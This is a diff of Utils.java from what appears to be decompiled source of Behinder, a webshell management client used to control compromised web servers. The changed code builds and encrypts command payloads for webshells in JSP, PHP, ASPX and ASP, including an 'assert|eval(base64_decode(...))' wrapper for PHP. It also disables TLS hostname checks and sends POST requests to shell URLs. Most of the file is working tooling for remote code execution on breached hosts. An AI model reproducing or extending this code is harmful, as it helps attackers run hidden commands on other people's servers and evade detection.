@@ -1,14 +1,13 @@
 package net.rebeyond.behinder.utils;
 
-import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import java.awt.Desktop;
 import java.awt.Toolkit;
 import java.awt.Desktop.Action;
 import java.awt.datatransfer.Clipboard;
 import java.awt.datatransfer.ClipboardOwner;
+import java.awt.datatransfer.DataFlavor;
 import java.awt.datatransfer.StringSelection;
 import java.awt.datatransfer.Transferable;
-import java.io.BufferedInputStream;
 import java.io.BufferedReader;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -16,6 +15,7 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -30,6 +30,7 @@ import java.net.Proxy;
 import java.net.Socket;
 import java.net.URI;
 import java.net.URL;
+import java.net.URLDecoder;
 import java.net.UnknownHostException;
 import java.security.KeyManagementException;
 import java.security.MessageDigest;
@@ -37,27 +38,31 @@ import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
 import java.security.cert.X509Certificate;
 import java.sql.Timestamp;
+import java.text.NumberFormat;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Base64;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
-import java.util.Properties;
+import java.util.Optional;
 import java.util.Random;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import java.util.stream.Collector;
 import java.util.zip.GZIPInputStream;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipFile;
-import java.util.zip.ZipInputStream;
 import javafx.scene.control.Alert;
+import javafx.scene.control.Label;
+import javafx.scene.control.TextField;
 import javafx.scene.control.Alert.AlertType;
+import javafx.scene.image.Image;
+import javafx.scene.layout.GridPane;
+import javafx.stage.Stage;
 import javafx.stage.Window;
 import javax.net.ssl.HostnameVerifier;
 import javax.net.ssl.HttpsURLConnection;
@@ -73,17 +78,43 @@ import javax.tools.ForwardingJavaFileManager;
 import javax.tools.JavaFileManager;
 import javax.tools.JavaFileObject;
 import javax.tools.SimpleJavaFileObject;
-import javax.tools.JavaFileManager.Location;
 import javax.tools.JavaFileObject.Kind;
 import net.rebeyond.behinder.core.Constants;
 import net.rebeyond.behinder.core.Crypt;
+import net.rebeyond.behinder.core.ICrypt;
 import net.rebeyond.behinder.core.Params;
+import net.rebeyond.behinder.entity.TransProtocol;
 import net.rebeyond.behinder.ui.controller.MainController;
 import net.rebeyond.behinder.utils.jc.Run;
+import org.json.JSONArray;
 import org.json.JSONObject;
 
 public class Utils {
    private static Map fileObjects = new ConcurrentHashMap();
+   public static Map alertMap = new HashMap();
+
+   public static Alert getAlert(Alert.AlertType type) {
+      Alert alert = (Alert)alertMap.get(type);
+      if (alert == null) {
+         alert = new Alert(type);
+         Stage stage = (Stage)alert.getDialogPane().getScene().getWindow();
+
+         try {
+            stage.getIcons().add(new Image(new ByteArrayInputStream(getResourceData("net/rebeyond/behinder/resource/logo.jpg"))));
+         } catch (Exception var4) {
+         }
+
+         alert.setResizable(true);
+         alert.setHeaderText("");
+         Window window = alert.getDialogPane().getScene().getWindow();
+         window.setOnCloseRequest((e) -> {
+            window.hide();
+         });
+         alertMap.put(type, alert);
+      }
+
+      return alert;
+   }
 
    public static boolean checkIP(String ipAddress) {
       String ip = "([1-9]|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])(\\.(\\d|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])){3}";
@@ -99,224 +130,8 @@ public class Utils {
       return matcher.matches() && Integer.parseInt(portTxt) >= 1 && Integer.parseInt(portTxt) <= 65535;
    }
 
-   public static Map getKeyAndCookie(String getUrl, String password, Map requestHeaders) throws Exception {
-      Map getHeaders = new HashMap();
-      getHeaders.putAll(requestHeaders);
-      getHeaders.remove("Content-Type");
-      getHeaders.remove("Referer");
-      requestHeaders = getHeaders;
-      Map result = new HashMap();
-      StringBuffer sb = new StringBuffer();
-      InputStreamReader isr = null;
-      BufferedReader br = null;
-      URL url;
-      if (getUrl.indexOf("?") > 0) {
-         url = new URL(getUrl + "&" + password + "=" + (new Random()).nextInt(1000));
-      } else {
-         url = new URL(getUrl + "?" + password + "=" + (new Random()).nextInt(1000));
-      }
-
-      HttpURLConnection.setFollowRedirects(false);
-      Object urlConnection;
-      Proxy proxy;
-      if (url.getProtocol().equals("https")) {
-         if (MainController.currentProxy.get("proxy") != null) {
-            proxy = (Proxy)MainController.currentProxy.get("proxy");
-            urlConnection = (HttpsURLConnection)url.openConnection(proxy);
-         } else {
-            urlConnection = (HttpsURLConnection)url.openConnection();
-         }
-      } else if (MainController.currentProxy.get("proxy") != null) {
-         proxy = (Proxy)MainController.currentProxy.get("proxy");
-         urlConnection = (HttpURLConnection)url.openConnection(proxy);
-      } else {
-         urlConnection = (HttpURLConnection)url.openConnection();
-      }
-
-      Iterator var25 = getHeaders.keySet().iterator();
-
-      String errorMsg;
-      while(var25.hasNext()) {
-         errorMsg = (String)var25.next();
-         ((HttpURLConnection)urlConnection).setRequestProperty(errorMsg, (String)requestHeaders.get(errorMsg));
-      }
-
-      if (((HttpURLConnection)urlConnection).getResponseCode() == 302 || ((HttpURLConnection)urlConnection).getResponseCode() == 301) {
-         String urlwithSession = ((String)((List)((HttpURLConnection)urlConnection).getHeaderFields().get("Location")).get(0)).toString();
-         if (!urlwithSession.startsWith("http")) {
-            urlwithSession = url.getProtocol() + "://" + url.getHost() + ":" + (url.getPort() == -1 ? url.getDefaultPort() : url.getPort()) + urlwithSession;
-            urlwithSession = urlwithSession.replaceAll(password + "=[0-9]*", "");
-         }
-
-         result.put("urlWithSession", urlwithSession);
-      }
-
-      boolean error = false;
-      errorMsg = "";
-      if (((HttpURLConnection)urlConnection).getResponseCode() == 500) {
-         isr = new InputStreamReader(((HttpURLConnection)urlConnection).getErrorStream());
-         error = true;
-         char[] buf = new char[512];
-         int bytesRead = isr.read();
-         new ByteArrayOutputStream();
-
-         while(bytesRead > 0) {
-            bytesRead = isr.read(buf);
-         }
-
-         errorMsg = "密钥获取失败,密码错误?";
-      } else if (((HttpURLConnection)urlConnection).getResponseCode() == 404) {
-         isr = new InputStreamReader(((HttpURLConnection)urlConnection).getErrorStream());
-         error = true;
-         errorMsg = "页面返回404错误";
-      } else {
-         isr = new InputStreamReader(((HttpURLConnection)urlConnection).getInputStream());
-      }
-
-      br = new BufferedReader(isr);
-
-      String line;
-      while((line = br.readLine()) != null) {
-         sb.append(line);
-      }
-
-      br.close();
-      if (error) {
-         throw new Exception(errorMsg);
-      } else {
-         String rawKey_1 = sb.toString();
-         String pattern = "[a-fA-F0-9]{16}";
-         Pattern r = Pattern.compile(pattern);
-         Matcher m = r.matcher(rawKey_1);
-         if (!m.find()) {
-            throw new Exception("页面存在，但是无法获取密钥!");
-         } else {
-            int start = 0;
-            int end = 0;
-            int cycleCount = 0;
-
-            while(true) {
-               Map KeyAndCookie = getRawKey(getUrl, password, requestHeaders);
-               String rawKey_2 = (String)KeyAndCookie.get("key");
-               byte[] temp = CipherUtils.bytesXor(rawKey_1.getBytes(), rawKey_2.getBytes());
-
-               int i;
-               for(i = 0; i < temp.length; ++i) {
-                  if (temp[i] > 0) {
-                     if (start == 0 || i <= start) {
-                        start = i;
-                     }
-                     break;
-                  }
-               }
-
-               for(i = temp.length - 1; i >= 0; --i) {
-                  if (temp[i] > 0) {
-                     if (i >= end) {
-                        end = i + 1;
-                     }
-                     break;
-                  }
-               }
-
-               if (end - start == 16) {
-                  result.put("cookie", KeyAndCookie.get("cookie"));
-                  result.put("beginIndex", start + "");
-                  result.put("endIndex", temp.length - end + "");
-                  String finalKey = new String(Arrays.copyOfRange(rawKey_2.getBytes(), start, end));
-                  result.put("key", finalKey);
-                  return result;
-               }
-
-               if (cycleCount > 10) {
-                  throw new Exception("Can't figure out the key!");
-               }
-
-               ++cycleCount;
-            }
-         }
-      }
-   }
-
    public static String getKey(String password) throws Exception {
       return getMD5(password);
-   }
-
-   public static Map getRawKey(String getUrl, String password, Map requestHeaders) throws Exception {
-      Map result = new HashMap();
-      StringBuffer sb = new StringBuffer();
-      InputStreamReader isr = null;
-      BufferedReader br = null;
-      URL url;
-      if (getUrl.indexOf("?") > 0) {
-         url = new URL(getUrl + "&" + password + "=" + (new Random()).nextInt(1000));
-      } else {
-         url = new URL(getUrl + "?" + password + "=" + (new Random()).nextInt(1000));
-      }
-
-      HttpURLConnection.setFollowRedirects(false);
-      Object urlConnection;
-      if (url.getProtocol().equals("https")) {
-         urlConnection = (HttpsURLConnection)url.openConnection();
-      } else {
-         urlConnection = (HttpURLConnection)url.openConnection();
-      }
-
-      Iterator var9 = requestHeaders.keySet().iterator();
-
-      while(var9.hasNext()) {
-         String headerName = (String)var9.next();
-         ((HttpURLConnection)urlConnection).setRequestProperty(headerName, (String)requestHeaders.get(headerName));
-      }
-
-      String cookieValues = "";
-      Map headers = ((HttpURLConnection)urlConnection).getHeaderFields();
-      Iterator var11 = headers.keySet().iterator();
-
-      String errorMsg;
-      while(var11.hasNext()) {
-         errorMsg = (String)var11.next();
-         if (errorMsg != null && errorMsg.equalsIgnoreCase("Set-Cookie")) {
-            String cookieValue;
-            for(Iterator var13 = ((List)headers.get(errorMsg)).iterator(); var13.hasNext(); cookieValues = cookieValues + ";" + cookieValue) {
-               cookieValue = (String)var13.next();
-               cookieValue = cookieValue.replaceAll(";[\\s]*path=[\\s\\S]*;?", "");
-            }
-
-            cookieValues = cookieValues.startsWith(";") ? cookieValues.replaceFirst(";", "") : cookieValues;
-            break;
-         }
-      }
-
-      result.put("cookie", cookieValues);
-      boolean error = false;
-      errorMsg = "";
-      if (((HttpURLConnection)urlConnection).getResponseCode() == 500) {
-         isr = new InputStreamReader(((HttpURLConnection)urlConnection).getErrorStream());
-         error = true;
-         errorMsg = "密钥获取失败,密码错误?";
-      } else if (((HttpURLConnection)urlConnection).getResponseCode() == 404) {
-         isr = new InputStreamReader(((HttpURLConnection)urlConnection).getErrorStream());
-         error = true;
-         errorMsg = "页面返回404错误";
-      } else {
-         isr = new InputStreamReader(((HttpURLConnection)urlConnection).getInputStream());
-      }
-
-      br = new BufferedReader(isr);
-
-      String line;
-      while((line = br.readLine()) != null) {
-         sb.append(line);
-      }
-
-      br.close();
-      if (error) {
-         throw new Exception(errorMsg);
-      } else {
-         result.put("key", sb.toString());
-         return result;
-      }
    }
 
    public static String sendPostRequest(String urlPath, String cookie, String data) throws Exception {
@@ -356,6 +171,10 @@ public class Utils {
    }
 
    public static Map sendPostRequestBinary(String urlPath, Map header, byte[] data) throws Exception {
+      return OKHttpClientUtil.post(urlPath, header, data);
+   }
+
+   public static Map sendPostRequestBinaryOld(String urlPath, Map header, byte[] data) throws Exception {
       Map result = new HashMap();
       ByteArrayOutputStream bos = new ByteArrayOutputStream();
       URL url = new URL(urlPath);
@@ -370,7 +189,7 @@ public class Utils {
       conn.setConnectTimeout(15000);
       conn.setUseCaches(false);
       conn.setRequestMethod("POST");
-      int length = 0;
+      int length;
       if (header != null) {
          Object[] keys = header.keySet().toArray();
          Arrays.sort(keys);
@@ -383,6 +202,7 @@ public class Utils {
          }
       }
 
+      conn.setRequestProperty("Pragma", (String)null);
       conn.setDoOutput(true);
       conn.setDoInput(true);
       conn.setUseCaches(false);
@@ -394,14 +214,14 @@ public class Utils {
          String encoding = conn.getContentEncoding();
          DataInputStream din;
          byte[] buffer;
-         boolean var24;
+         length = 0;
          if (encoding != null) {
             if (encoding != null && encoding.equals("gzip")) {
                din = null;
                GZIPInputStream gZIPInputStream = new GZIPInputStream(conn.getInputStream());
                din = new DataInputStream(gZIPInputStream);
                buffer = new byte[1024];
-               boolean var12 = false;
+               length = 0;
 
                while((length = din.read(buffer)) != -1) {
                   bos.write(buffer, 0, length);
@@ -409,7 +229,7 @@ public class Utils {
             } else {
                din = new DataInputStream(conn.getInputStream());
                buffer = new byte[1024];
-               var24 = false;
+               length = 0;
 
                while((length = din.read(buffer)) != -1) {
                   bos.write(buffer, 0, length);
@@ -418,7 +238,7 @@ public class Utils {
          } else {
             din = new DataInputStream(conn.getInputStream());
             buffer = new byte[1024];
-            var24 = false;
+            length = 0;
 
             while((length = din.read(buffer)) != -1) {
                bos.write(buffer, 0, length);
@@ -441,7 +261,7 @@ public class Utils {
       } else {
          DataInputStream din = new DataInputStream(conn.getErrorStream());
          byte[] buffer = new byte[1024];
-         boolean var21 = false;
+         length = 0;
 
          while((length = din.read(buffer)) != -1) {
             bos.write(buffer, 0, length);
@@ -486,6 +306,16 @@ public class Utils {
 
          throw new Exception("请求返回异常" + sb.toString());
       }
+   }
+
+   public static byte[] shortToBytes(int n) {
+      byte[] b = new byte[]{(byte)(n >> 8 & 255), (byte)(n & 255)};
+      return b;
+   }
+
+   public static byte[] intToBytes(int n) {
+      byte[] b = new byte[]{(byte)(n >> 24 & 255), (byte)(n >> 16 & 255), (byte)(n >> 8 & 255), (byte)(n & 255)};
+      return b;
    }
 
    public static String sendGetRequest(String urlPath, String cookie) throws Exception {
@@ -535,53 +365,96 @@ public class Utils {
       return false;
    }
 
-   public static byte[] getEvalData(String key, int encryptType, String type, byte[] payload) throws Exception {
-      byte[] result = null;
-      byte[] encrypedBincls;
+   public static byte[] getEvalDataWithTransprotocol(ICrypt cryptor, String key, String type, byte[] payload) throws Exception {
+      TransProtocol transProtocol = cryptor.getTransProtocol(type);
+      Map params = new HashMap();
+      byte[] bincls = new byte[0];
       if (type.equals("jsp")) {
-         encrypedBincls = Crypt.Encrypt(payload, key);
-         String basedEncryBincls = Base64.encode(encrypedBincls);
-         result = basedEncryBincls.getBytes();
+         bincls = Params.getParamedClass("Eval", (Map)params, (TransProtocol)transProtocol);
+      } else if (type.equals("asp")) {
+         bincls = (new String(bincls)).replace("__Encrypt__", transProtocol.getEncode()).getBytes();
       } else if (type.equals("php")) {
-         encrypedBincls = ("assert|eval(base64_decode('" + Base64.encode(payload) + "'));").getBytes();
-         encrypedBincls = Crypt.EncryptForPhp(encrypedBincls, key, encryptType);
-         result = Base64.encode(encrypedBincls).getBytes();
+         bincls = (new String(bincls) + "\n" + transProtocol.getEncode() + "\n").getBytes();
+      } else if (type.equals("aspx")) {
+      }
+
+      return getEvalData(cryptor, key, type, bincls);
+   }
+
+   public static byte[] getEvalData(ICrypt cryptor, String key, String type, byte[] payload) throws Exception {
+      byte[] result = null;
+      if (type.equals("jsp")) {
+         result = cryptor.encrypt(payload);
+      } else if (type.equals("php")) {
+         result = cryptor.encrypt(payload);
       } else if (type.equals("aspx")) {
          Map params = new LinkedHashMap();
          params.put("code", new String(payload));
-         result = getData(key, encryptType, "Eval", params, type);
+         result = getData(cryptor, "Eval", params, type);
       } else if (type.equals("asp")) {
-         encrypedBincls = Crypt.EncryptForAsp(payload, key);
-         result = encrypedBincls;
+         result = cryptor.encrypt(payload);
       }
 
       return result;
    }
 
-   public static byte[] getPluginData(String key, int encryptType, String payloadPath, Map params, String type) throws Exception {
+   public static String bytesToHex(byte[] bytes) {
+      StringBuffer sb = new StringBuffer();
+
+      for(int i = 0; i < bytes.length; ++i) {
+         String hex = Integer.toHexString(bytes[i] & 255);
+         if (hex.length() < 2) {
+            sb.append(0);
+         }
+
+         sb.append(hex);
+      }
+
+      return sb.toString();
+   }
+
+   public static byte hexToByte(String inHex) {
+      return (byte)Integer.parseInt(inHex, 16);
+   }
+
+   public static byte[] hexToByteArray(String inHex) {
+      int hexlen = inHex.length();
+      byte[] result;
+      if (hexlen % 2 == 1) {
+         ++hexlen;
+         result = new byte[hexlen / 2];
+         inHex = "0" + inHex;
+      } else {
+         result = new byte[hexlen / 2];
+      }
+
+      int j = 0;
+
+      for(int i = 0; i < hexlen; i += 2) {
+         result[j] = hexToByte(inHex.substring(i, i + 2));
+         ++j;
+      }
+
+      return result;
+   }
+
+   public static byte[] getPluginData(String key, String payloadPath, Map params, String type) throws Exception {
       byte[] bincls;
       if (type.equals("jsp")) {
          bincls = Params.getParamedClassForPlugin(payloadPath, params);
          return bincls;
+      } else if (type.equals("php")) {
+         bincls = Params.getParamedPhpForPlugin(payloadPath, params);
+         return bincls;
+      } else if (type.equals("aspx")) {
+         bincls = Params.getParamedAssemblyForPlugin(payloadPath, params);
+         return bincls;
+      } else if (type.equals("asp")) {
+         bincls = Params.getParamedAsp(payloadPath, params);
+         byte[] encrypedBincls = Crypt.EncryptForAsp(bincls, key);
+         return encrypedBincls;
       } else {
-         byte[] encrypedBincls;
-         if (type.equals("php")) {
-            bincls = Params.getParamedPhp(payloadPath, params);
-            bincls = Base64.encode(bincls).getBytes();
-            bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
-            encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
-            return Base64.encode(encrypedBincls).getBytes();
-         } else if (type.equals("aspx")) {
-            bincls = Params.getParamedAssembly(payloadPath, params);
-            encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
-            return encrypedBincls;
-         } else if (type.equals("asp")) {
-            bincls = Params.getParamedAsp(payloadPath, params);
-            encrypedBincls = Crypt.EncryptForAsp(bincls, key);
-            return encrypedBincls;
-         } else {
-            return null;
-         }
+         return null;
       }
    }
 
@@ -605,6 +478,68 @@ public class Utils {
       return extIndex >= 0 ? fileName.substring(extIndex + 1).toLowerCase() : "";
    }
 
+   public static byte[] getData(ICrypt cryptor, String className, Map params, String scriptType, byte[] extraData) throws Exception {
+      byte[] bincls;
+      byte[] encrypedBincls;
+      if (scriptType.equals("jsp")) {
+         bincls = Params.getParamedClass(className, params, cryptor.getTransProtocol(scriptType));
+         if (extraData != null) {
+            bincls = CipherUtils.mergeByteArray(bincls, extraData);
+         }
+
+         encrypedBincls = cryptor.encrypt(bincls);
+         return encrypedBincls;
+      } else if (scriptType.equals("php")) {
+         bincls = Params.getParamedPhp(className, params, cryptor.getTransProtocol(scriptType));
+         if (extraData != null) {
+            bincls = CipherUtils.mergeByteArray(bincls, extraData);
+         }
+
+         encrypedBincls = cryptor.encrypt(bincls);
+         return encrypedBincls;
+      } else if (scriptType.equals("aspx")) {
+         bincls = Params.getParamedAssembly(className, params, cryptor.getTransProtocol(scriptType));
+         if (extraData != null) {
+            bincls = CipherUtils.mergeByteArray(bincls, extraData);
+         }
+
+         encrypedBincls = cryptor.encrypt(bincls);
+         return encrypedBincls;
+      } else if (scriptType.equals("asp")) {
+         bincls = Params.getParamedAsp(className, params, cryptor.getTransProtocol(scriptType));
+         encrypedBincls = cryptor.encrypt(bincls);
+         return encrypedBincls;
+      } else if (!scriptType.equals("native")) {
+         return null;
+      } else {
+         JSONObject payloadObj = new JSONObject();
+         String shellAction = getShellAction(5);
+         if (shellAction.equals("parseCommonAction")) {
+            shellAction = getShellAction(6);
+         }
+
+         payloadObj.put("action", shellAction);
+         JSONArray paramArr = new JSONArray();
+         Iterator var8 = params.keySet().iterator();
+
+         while(var8.hasNext()) {
+            String paramName = (String)var8.next();
+            JSONObject paramObj = new JSONObject();
+            paramObj.put("name", paramName);
+            paramObj.put("value", params.get(paramName));
+            paramArr.put(paramObj);
+         }
+
+         payloadObj.put("params", paramArr);
+         encrypedBincls = cryptor.encryptCompatible(payloadObj.toString().getBytes());
+         return encrypedBincls;
+      }
+   }
+
+   public static byte[] getData(ICrypt cryptor, String className, Map params, String scriptType) throws Exception {
+      return getData(cryptor, className, params, scriptType, (byte[])null);
+   }
+
    public static byte[] getData(String key, int encryptType, String className, Map params, String type, byte[] extraData) throws Exception {
       byte[] bincls;
       byte[] encrypedBincls;
@@ -615,18 +550,18 @@ public class Utils {
          }
 
          encrypedBincls = Crypt.Encrypt(bincls, key);
-         String basedEncryBincls = Base64.encode(encrypedBincls);
+         String basedEncryBincls = Base64.getEncoder().encodeToString(encrypedBincls);
          return basedEncryBincls.getBytes();
       } else if (type.equals("php")) {
          bincls = Params.getParamedPhp(className, params);
-         bincls = Base64.encode(bincls).getBytes();
+         bincls = Base64.getEncoder().encodeToString(bincls).getBytes();
          bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
          if (extraData != null) {
             bincls = CipherUtils.mergeByteArray(bincls, extraData);
          }
 
          encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
-         return Base64.encode(encrypedBincls).getBytes();
+         return ("\n" + Base64.getEncoder().encodeToString(encrypedBincls)).getBytes();
       } else if (type.equals("aspx")) {
          bincls = Params.getParamedAssembly(className, params);
          if (extraData != null) {
@@ -643,9 +578,38 @@ public class Utils {
 
          encrypedBincls = Crypt.EncryptForAsp(bincls, key);
          return encrypedBincls;
-      } else {
+      } else if (!type.equals("native")) {
          return null;
+      } else {
+         JSONObject payloadObj = new JSONObject();
+         String shellAction = getShellAction(5);
+         payloadObj.put("action", shellAction);
+         JSONArray paramArr = new JSONArray();
+         Iterator var9 = params.keySet().iterator();
+
+         String basedEncryBincls;
+         while(var9.hasNext()) {
+            basedEncryBincls = (String)var9.next();
+            JSONObject paramObj = new JSONObject();
+            paramObj.put("name", basedEncryBincls);
+            paramObj.put("value", params.get(basedEncryBincls));
+            paramArr.put(paramObj);
+         }
+
+         payloadObj.put("params", paramArr);
+         encrypedBincls = Crypt.Encrypt(payloadObj.toString().getBytes(), key);
+         basedEncryBincls = Base64.getEncoder().encodeToString(encrypedBincls);
+         return (basedEncryBincls + "\n").getBytes();
       }
+   }
+
+   public static String getShellAction(int depth) {
+      return getMethodName(depth);
+   }
+
+   public static String getMethodName(int depth) {
+      StackTraceElement[] ste = Thread.currentThread().getStackTrace();
+      return ste[depth].getMethodName();
    }
 
    public static byte[] getFileData(String filePath) throws Exception {
@@ -653,21 +617,26 @@ public class Utils {
       FileInputStream fis = new FileInputStream(new File(filePath));
       byte[] buffer = new byte[10240000];
 
-      int length;
-      for(boolean var4 = false; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
+      for(int length = 0; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
       }
 
       fis.close();
       return fileContent;
    }
 
+   public static void writeFileData(String filePath, byte[] fileContent) throws Exception {
+      FileOutputStream fso = new FileOutputStream(filePath);
+      fso.write(fileContent);
+      fso.flush();
+      fso.close();
+   }
+
    public static List splitBytes(byte[] content, int size) throws Exception {
       List result = new ArrayList();
       byte[] buffer = new byte[size];
       ByteArrayInputStream bis = new ByteArrayInputStream(content);
-      boolean var5 = false;
+      int length = 0;
 
-      int length;
       while((length = bis.read(buffer)) > 0) {
          result.add(Arrays.copyOfRange(buffer, 0, length));
       }
@@ -676,19 +645,49 @@ public class Utils {
       return result;
    }
 
+   public static String[] splitString(String str, int length) {
+      int len = str.length();
+      String[] arr = new String[(len + length - 1) / length];
+
+      for(int i = 0; i < len; i += length) {
+         int n = len - i;
+         if (n > length) {
+            n = length;
+         }
+
+         arr[i / length] = str.substring(i, i + n);
+      }
+
+      return arr;
+   }
+
    public static void setClipboardString(String text) {
       Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
       Transferable trans = new StringSelection(text);
       clipboard.setContents(trans, (ClipboardOwner)null);
    }
 
+   public static String getClipboardString() {
+      String result = "";
+      Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
+      Transferable trnas = clipboard.getContents((Object)null);
+      if (trnas != null && trnas.isDataFlavorSupported(DataFlavor.stringFlavor)) {
+         try {
+            result = (String)trnas.getTransferData(DataFlavor.stringFlavor);
+         } catch (Exception var4) {
+            var4.printStackTrace();
+         }
+      }
+
+      return result;
+   }
+
    public static byte[] getResourceData(String filePath) throws Exception {
       InputStream is = Utils.class.getClassLoader().getResourceAsStream(filePath);
       ByteArrayOutputStream bos = new ByteArrayOutputStream();
       byte[] buffer = new byte[102400];
-      boolean var4 = false;
+      int num = 0;
 
-      int num;
       while((num = is.read(buffer)) != -1) {
          bos.write(buffer, 0, num);
          bos.flush();
@@ -724,6 +723,33 @@ public class Utils {
       return output.toByteArray();
    }
 
+   public static JSONObject entity2jsonObject(Object entity) {
+      JSONObject jsonObject = new JSONObject();
+      Field[] var2 = entity.getClass().getDeclaredFields();
+      int var3 = var2.length;
+
+      for(int var4 = 0; var4 < var3; ++var4) {
+         Field field = var2[var4];
+
+         try {
+            String name = field.getName();
+            String value = field.get(entity).toString();
+            jsonObject.put(name, value);
+         } catch (IllegalAccessException var8) {
+            var8.printStackTrace();
+         }
+      }
+
+      return jsonObject;
+   }
+
+   public static String getPercent(int small, int big) {
+      NumberFormat numberFormat = NumberFormat.getInstance();
+      numberFormat.setMaximumFractionDigits(2);
+      String result = numberFormat.format((double)((float)small / (float)big * 100.0F)) + "%";
+      return result;
+   }
+
    public static byte[] getClassFromSourceCode(String sourceCode) throws Exception {
       return Run.getClassFromSourceCode(sourceCode);
    }
@@ -735,6 +761,10 @@ public class Utils {
       return currentPath;
    }
 
+   public static String getSelfPath(String coding) throws Exception {
+      return URLDecoder.decode(getSelfPath(), coding);
+   }
+
    public static String getSelfJarPath() throws Exception {
       String currentPath = Utils.class.getProtectionDomain().getCodeSource().getLocation().getPath().toString();
       if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0 && currentPath.startsWith("/")) {
@@ -742,45 +772,6 @@ public class Utils {
       }
 
       return currentPath;
-   }
-
-   public static JSONObject parsePluginZip(String zipFilePath) throws Exception {
-      String pluginRootPath = getSelfPath() + "/Plugins";
-      String pluginName = "";
-      ZipFile zf = new ZipFile(zipFilePath);
-      InputStream in = new BufferedInputStream(new FileInputStream(zipFilePath));
-      ZipInputStream zin = new ZipInputStream(in);
-
-      ZipEntry ze;
-      while((ze = zin.getNextEntry()) != null) {
-         if (ze.getName().equals("plugin.config")) {
-            BufferedReader br = new BufferedReader(new InputStreamReader(zf.getInputStream(ze)));
-            Properties pluginConfig = new Properties();
-            pluginConfig.load(br);
-            pluginName = pluginConfig.getProperty("name");
-            br.close();
-         }
-      }
-
-      zin.closeEntry();
-      String pluginPath = pluginRootPath + "/" + pluginName;
-      ZipUtil.unZipFiles(zipFilePath, pluginPath);
-      FileInputStream fis = new FileInputStream(pluginPath + "/plugin.config");
-      Properties pluginConfig = new Properties();
-      pluginConfig.load(fis);
-      JSONObject pluginEntity = new JSONObject();
-      pluginEntity.put("name", (Object)pluginName);
-      pluginEntity.put("version", (Object)pluginConfig.getProperty("version", "v1.0"));
-      pluginEntity.put("entryFile", (Object)pluginConfig.getProperty("entry", "index.htm"));
-      pluginEntity.put("icon", (Object)pluginConfig.getProperty("icon", "/Users/rebeyond/host.png"));
-      pluginEntity.put("scriptType", (Object)pluginConfig.getProperty("scriptType"));
-      pluginEntity.put("isGetShell", (Object)pluginConfig.getProperty("isGetShell"));
-      pluginEntity.put("type", (Object)pluginConfig.getProperty("type"));
-      pluginEntity.put("author", (Object)pluginConfig.getProperty("author"));
-      pluginEntity.put("link", (Object)pluginConfig.getProperty("link"));
-      pluginEntity.put("qrcode", (Object)pluginConfig.getProperty("qrcode"));
-      pluginEntity.put("comment", (Object)pluginConfig.getProperty("comment"));
-      return pluginEntity;
    }
 
    public static Object json2Obj(JSONObject json, Class target) throws Exception {
@@ -823,6 +814,47 @@ public class Utils {
       }
    }
 
+   public static String getMD5(byte[] input) throws NoSuchAlgorithmException {
+      if (input != null && input.length != 0) {
+         MessageDigest md5 = MessageDigest.getInstance("MD5");
+         md5.update(input);
+         byte[] byteArray = md5.digest();
+         StringBuilder sb = new StringBuilder();
+         byte[] var4 = byteArray;
+         int var5 = byteArray.length;
+
+         for(int var6 = 0; var6 < var5; ++var6) {
+            byte b = var4[var6];
+            sb.append(String.format("%02x", b));
+         }
+
+         return sb.toString().substring(0, 16);
+      } else {
+         return null;
+      }
+   }
+
+   public static String getFileMD5(String filePath) throws Exception {
+      byte[] input = getFileData(filePath);
+      if (input != null && input.length != 0) {
+         MessageDigest md5 = MessageDigest.getInstance("MD5");
+         md5.update(input);
+         byte[] byteArray = md5.digest();
+         StringBuilder sb = new StringBuilder();
+         byte[] var5 = byteArray;
+         int var6 = byteArray.length;
+
+         for(int var7 = 0; var7 < var6; ++var7) {
+            byte b = var5[var7];
+            sb.append(String.format("%02x", b));
+         }
+
+         return sb.substring(0, 16);
+      } else {
+         return null;
+      }
+   }
+
    public static void main(String[] args) {
       String sourceCode = "package net.rebeyond.behinder.utils;public class Hello{    public String sayHello (String name) {return \"Hello,\" + name + \"!\";}}";
 
@@ -860,7 +892,7 @@ public class Utils {
             }
          }
 
-         HttpsURLConnection.setDefaultSSLSocketFactory(new Utils.MySSLSocketFactory(sc.getSocketFactory(), (String[])cipherSuites.toArray(new String[0])));
+         HttpsURLConnection.setDefaultSSLSocketFactory(new MySSLSocketFactory(sc.getSocketFactory(), (String[])cipherSuites.toArray(new String[0])));
          HostnameVerifier allHostsValid = new HostnameVerifier() {
             public boolean verify(String hostname, SSLSession session) {
                return true;
@@ -885,6 +917,10 @@ public class Utils {
       }
 
       return result;
+   }
+
+   public static Timestamp getCurrentDate() {
+      return new Timestamp(System.currentTimeMillis());
    }
 
    public static Timestamp stringToTimestamp(String timeString) {
@@ -1054,6 +1090,35 @@ public class Utils {
       alert.show();
    }
 
+   public static Optional showConfirmMessage(String title, String msg) {
+      Alert confirmDialog = getAlert(AlertType.CONFIRMATION);
+      confirmDialog.setResizable(true);
+      confirmDialog.setHeaderText("");
+      confirmDialog.setTitle(title);
+      confirmDialog.setContentText(msg);
+      Optional result = confirmDialog.showAndWait();
+      return result;
+   }
+
